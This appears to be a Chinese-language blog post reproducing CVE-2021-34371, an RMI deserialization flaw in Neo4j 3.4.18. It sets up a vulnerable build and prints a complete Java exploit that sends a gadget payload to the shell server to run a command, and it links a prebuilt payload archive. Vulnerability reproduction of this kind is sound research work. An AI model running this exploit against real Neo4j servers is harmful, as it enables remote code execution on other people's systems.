<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-32*32.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat-32*32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat-16*16.ico">
  <link rel="mask-icon" href="/images/cat-32*32.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"lycshub.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="配置环境git clone仓库https:&#x2F;&#x2F;github.com&#x2F;neo4j&#x2F;neo4j&#x2F;tree&#x2F;3.4.18 注意分支，最后有漏洞的版本是3.4.18 按照官方教程安装 mvn clean install  修改一下配置文件，开启neo4j-shell（触发漏洞必要配置） neo4j-3.4.18&#x2F;packaging&#x2F;standalone&#x2F;target&#x2F;neo4j-community-3.4">
<meta property="og:type" content="article">
<meta property="og:title" content="复现cve-2021-34371">
<meta property="og:url" content="https://lycshub.github.io/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/index.html">
<meta property="og:site_name" content="Lyc&#39;s Blog">
<meta property="og:description" content="配置环境git clone仓库https:&#x2F;&#x2F;github.com&#x2F;neo4j&#x2F;neo4j&#x2F;tree&#x2F;3.4.18 注意分支，最后有漏洞的版本是3.4.18 按照官方教程安装 mvn clean install  修改一下配置文件，开启neo4j-shell（触发漏洞必要配置） neo4j-3.4.18&#x2F;packaging&#x2F;standalone&#x2F;target&#x2F;neo4j-community-3.4">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027089235-2022-4-2710:38:09.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027154337-2022-4-2710:39:15.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027194321-2022-4-2710:39:55.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027234860-2022-4-2710:40:35.png">
<meta property="og:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027259854-2022-4-2710:41:00.png">
<meta property="article:published_time" content="2022-06-04T01:19:05.000Z">
<meta property="article:modified_time" content="2022-06-04T01:51:18.000Z">
<meta property="article:author" content="Harry Smith">
<meta property="article:tag" content="cve">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027089235-2022-4-2710:38:09.png">

<link rel="canonical" href="https://lycshub.github.io/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>复现cve-2021-34371 | Lyc's Blog</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-212139889-1"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-212139889-1');
      }
    </script>






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Lyc's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://lycshub.github.io/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/natumetakasi-2021-11-318%3A56%3A10.jpg">
      <meta itemprop="name" content="Harry Smith">
      <meta itemprop="description" content="取次花丛懒回顾，半缘修道半缘君">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lyc's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          复现cve-2021-34371
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-04 09:19:05 / Modified: 09:51:18" itemprop="dateCreated datePublished" datetime="2022-06-04T09:19:05+08:00">2022-06-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus: </span>
    
    <a title="disqus" href="/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/06/04/复现cve-2021-34371/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>git clone仓库<a target="_blank" rel="noopener" href="https://github.com/neo4j/neo4j/tree/3.4.18">https://github.com/neo4j/neo4j/tree/3.4.18</a></p>
<p>注意分支，最后有漏洞的版本是3.4.18</p>
<p>按照官方教程安装</p>
<p><code>mvn clean install</code></p>
<ul>
<li><p><strong>修改一下配置文件，开启neo4j-shell</strong>（触发漏洞必要配置）</p>
<p><code>neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</code>的neo4j.conf</p>
<p>修改enabled为true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Enable a remote shell server which Neo4j Shell clients can log in to.</span><br><span class="line">dbms.shell.enabled=true</span><br><span class="line"># The network interface IP the shell will listen on (use 0.0.0.0 for all interfaces).</span><br><span class="line">dbms.shell.host=127.0.0.1</span><br><span class="line"># The port the shell will listen on, default is 1337.</span><br><span class="line">dbms.shell.port=1337</span><br></pre></td></tr></table></figure></li>
</ul>
<p>cd到<code>packaging/standalone/target</code> 运行<code>bin/neo4j start</code></p>
<p>然后会看到启动成功的标识，访问<a target="_blank" rel="noopener" href="http://localhost:7474/">http://localhost:7474/</a> 成功即安装完成</p>
<p>（仅复现可以不需要以下步骤，直接打payalod即可）</p>
<p>调试思路:</p>
<p><strong>为了可以调试，需要获取到他真正的启动命令，而不是直接用shell脚本启动</strong></p>
<p><strong>然后配置一下远程启动（配合调试）</strong></p>
<p>远程调试可以看这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sincerity/p/11468390.html">https://www.cnblogs.com/Sincerity/p/11468390.html</a></p>
<p>目的就是让命令行运行的java虚拟机可以被idea调试（在有源码的情况下）</p>
<span id="more"></span>

<p>先从<code>bin/neo4j</code>中获取到实际命令行启动的参数</p>
<ol>
<li>获取实际运行命令</li>
</ol>
<p>在do_start()方法中加一条打印</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">do_start</span></span>() &#123;</span><br><span class="line">  check_status</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;NEO4J_PID:-&#125;</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Neo4j is already running (pid <span class="variable">$&#123;NEO4J_PID&#125;</span>).&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Starting Neo4j.&quot;</span></span><br><span class="line"></span><br><span class="line">  check_limits</span><br><span class="line">  build_classpath</span><br><span class="line"></span><br><span class="line">  assemble_command_line</span><br><span class="line">  command_line=(<span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span> <span class="comment"># 添加一条这个，然后观察命令行输出就可以获取到</span></span><br><span class="line">  nohup <span class="string">&quot;<span class="variable">$&#123;command_line[@]&#125;</span>&quot;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;CONSOLE_LOG&#125;</span>&quot;</span> 2&gt;&amp;1 &amp;</span><br><span class="line"> <span class="comment"># 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行<code>bin/neo4j start</code></p>
<p>大概是这样的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java -cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>



<p>因为要远程调试，所以启动命令加一条jvm配置<code>-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</code></p>
<p>即启动命令为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java </span><br><span class="line">-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</span><br><span class="line">-cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>

<p><strong>这里有个坑是zsh下我无法运行这条命令，换成bash就好了</strong></p>
<p>然后配置idea的远程调试本地端口，在idea中添加一个debug选项</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027089235-2022-4-2710:38:09.png"></p>
<p><code>use module classpath</code>选择community-build</p>
<h1 id="组装exp"><a href="#组装exp" class="headerlink" title="组装exp"></a>组装exp</h1><p>exp需要自己装一下，exploit-db里面写的很清楚（网址详见参考）</p>
<p>也可以直接用我这份组装好的</p>
<p><a target="_blank" rel="noopener" href="https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip">https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip</a></p>
<p>这里贴下exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////package runnable;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.shell.ShellServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static String COMMAND = &quot;touch /tmp/test.txt&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String COMMAND = <span class="string">&quot;gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET = <span class="string">&quot;rmi://127.0.0.1:1337&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET_BINDING = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> validBinding = checkBinding(TARGET_BINDING, TARGET);</span><br><span class="line">        <span class="keyword">if</span> (!validBinding)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[-] No valid binding found, shell server may not be listening. Exiting&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Found valid binding, proceeding to exploit&quot;</span>);</span><br><span class="line">        ShellServer server = (ShellServer) Naming.lookup(TARGET + <span class="string">&quot;/&quot;</span> + TARGET_BINDING);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object payload = new RhinoGadget().getObject(COMMAND);</span></span><br><span class="line">        Object payload = Payload.getObject(COMMAND);  <span class="comment">// .getObject(COMMAND);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.setSessionVariable(newClientId(), <span class="string">&quot;anything_here&quot;</span>, payload);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception UnmarshalException ) &#123;</span><br><span class="line"><span class="comment">//            UnmarshalException.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Caught an unmarshalled exception, this is expected.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Exploit completed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Just a helper method to validate that the rmi binding we&#x27;re looking for is present</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bindingToCheck the binding you&#x27;d like to check for</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetToCheck the rmi registry to check against</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true if the binding is present, false if not</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkBinding</span><span class="params">(String bindingToCheck, String targetToCheck)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Trying to enumerate server bindings: &quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String element : stub.list()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Found binding: &quot;</span> + element);</span><br><span class="line">                <span class="keyword">if</span> (element.equalsIgnoreCase(bindingToCheck))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Serializable <span class="title">newClientId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>启动neo4j然后运行exp</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027154337-2022-4-2710:39:15.png"></p>
<h2 id="调试定位漏洞原因"><a href="#调试定位漏洞原因" class="headerlink" title="调试定位漏洞原因"></a>调试定位漏洞原因</h2><p>调试了半天没断进去，</p>
<p>看了nvd对cve的描述是</p>
<blockquote>
<p>Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI  service that arbitrarily deserializes Java objects, e.g., through  setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.</p>
</blockquote>
<p>同时能成功rce的exp在调用的远程方法也是<code> server.setSessionVariable(newClientId(), &quot;anything_here&quot;, payload);</code></p>
<p>对这这个函数签名找了一下对应的源码，</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027194321-2022-4-2710:39:55.png"></p>
<p>然后在调用点都下了断点，但是打exp的时候并没有断进去</p>
<p>然后学到了一个姿势，<strong>直接把断点下在jdk命令命令执行的内部方法上 ，然后去跟踪堆栈信息</strong></p>
<p>直接打在ProcessBuilder的start方法上</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027234860-2022-4-2710:40:35.png"></p>
<p>断进来了</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027259854-2022-4-2710:41:00.png"></p>
<p>但是栈底一就是jdk内部的调用，没有断到neo4j的源码点上</p>
<p>然后跟了一下启动的流程吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 启动导致漏洞的neo4j-shell 开启了rmi</span><br><span class="line">load:81, ShellBootstrap (org.neo4j.shell.impl)</span><br><span class="line">start:47, ShellServerKernelExtension (org.neo4j.shell.impl)</span><br><span class="line"># 以下为启动基础neo4j</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:84, KernelExtensions (org.neo4j.kernel.extension)</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">initFacade:208, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">newFacade:125, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">lambda$static$0:58, CommunityNeoServer (org.neo4j.server)</span><br><span class="line">newGraphDatabase:-1, 85777802 (org.neo4j.server.CommunityNeoServer$$Lambda$107)</span><br><span class="line">start:88, LifecycleManagingDatabase (org.neo4j.server.database)</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:212, AbstractNeoServer (org.neo4j.server)</span><br><span class="line">start:111, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">start:79, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">main:32, CommunityEntryPoint (org.neo4j.server)</span><br></pre></td></tr></table></figure>



<p>依旧不清楚的是为什么没有断在那个<code> setSessionVariable</code>的方法中</p>
<p>但根据payload看造成漏洞的代码就是这个函数通过rmi载入了恶意了对象。</p>
<p>然后根据rmi自动反序列化导致了rce</p>
<p>然后新版本的修复是直接把这个类给删了，diff中看不到直接的修复</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-34371">https://nvd.nist.gov/vuln/detail/CVE-2021-34371</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50170">https://www.exploit-db.com/exploits/50170</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/cve/" rel="tag"># cve</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/06/04/cc%E9%93%BE%E5%AD%A6%E4%B9%A0/" rel="prev" title="cc链学习">
      <i class="fa fa-chevron-left"></i> cc链学习
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/06/04/popOS-vmware%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/" rel="next" title="popOS_vmware无法启动问题">
      popOS_vmware无法启动问题 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    
  <div class="comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
    </div>
  </div>
  

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
